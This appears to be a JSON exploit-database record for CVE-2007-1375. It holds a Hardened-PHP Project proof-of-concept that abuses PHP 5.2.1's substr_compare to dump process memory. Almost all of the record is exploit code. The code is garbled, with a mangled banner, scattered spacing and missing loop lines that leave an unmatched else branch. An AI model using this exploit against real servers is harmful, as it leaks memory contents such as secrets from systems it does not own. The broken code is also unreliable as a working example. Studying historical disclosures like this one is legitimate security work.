{
    "text": "ecve : CVE-2007-1375 ， title : PHP 5.2.1 - 'substr_compare (  ) ' Information Leak - Multiple local Exploit ， verified : Verified ， exploit_detail : <?php ， // _ _ _ _ ___ _ _ ___ // ， // |  |  |  | __ _ _ _ __ |  | ___ _ _ ___ __ |  | ___ | _ \\ |  |  |  |  | _ \\ // ， // | __ | / _` |  | '_ | / _` | / -_ )  | ' \\ / -_ ) / _` | ___ | _/ | __ |  | _/ // ， // | _ | _ | \\__ , _ | _ | \\__ , _ | \\___ | _ | _ | \\___ | \\__ , _ |  | _ |  | _ | _ | _ | // ， // // ， // Proof of concept code from the Hardened-PHP Project // ， // ( C ) Copyright 2007 Stefan Esser // ， // // ， // PHP 5 - substr_compare Information Leak Vulnerability // ， // This is meant as a protection against remote file inclusion. ， die ( \"REMOVE THIS LINE\" )  ;  ，  $ sizeofHashtable = 39 ;  ，  $ maxlong = 0x7fffffff ;  ，  $ sizeofHashtable = 67 ;  ，  $ maxlong = 0x7fffffffffffffff ;  ，  $ memdump = str_repeat ( \"A\" , 4096 )  ;  ， unset (  $ d [ 20 ]  )  ;  ，  $ x = str_repeat ( \"A\" ,  $ sizeofHashtable )  ;  ， // If the libc memcmp leaks the information use it ， // otherwise we only get a case insensitive memdump ，  $ b = substr_compare ( chr ( 65 )  , chr ( 0 )  , 0 , 1 , false )  ! = 65 ;  ，  $ y = substr_compare (  $ x , chr ( 0 )  ,  $ i+1 ,  $ maxlong ,  $ b )  ;  ，  $ Y = substr_compare (  $ x , chr ( 1 )  ,  $ i+1 ,  $ maxlong ,  $ b )  ;  ，  $ y = chr (  $ y )  ;  ，  $ y = strtoupper (  $ y )  ;  ，  $ memdump [  $ i ] = $ y ;  ， } else { ，  $ memdump [  $ i ] = chr ( 0 )  ; ",
    "time": "2007-03-07"
}